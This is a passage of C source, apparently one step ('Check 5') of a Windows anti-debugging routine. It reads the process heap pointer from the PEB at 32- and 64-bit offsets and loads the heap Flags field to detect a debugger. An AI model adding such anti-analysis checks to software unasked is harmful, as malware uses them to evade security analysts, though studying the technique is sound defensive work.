    /* Check 5: Heap flags */
    PVOID pHeap;
#if defined(_WIN64)
    pHeap = *(PVOID*)((PBYTE)pPeb + 0x30);
    DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
#else
    pHeap = *(PVOID*)((PBYTE)pPeb + 0x18);
    DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x40);
#endif
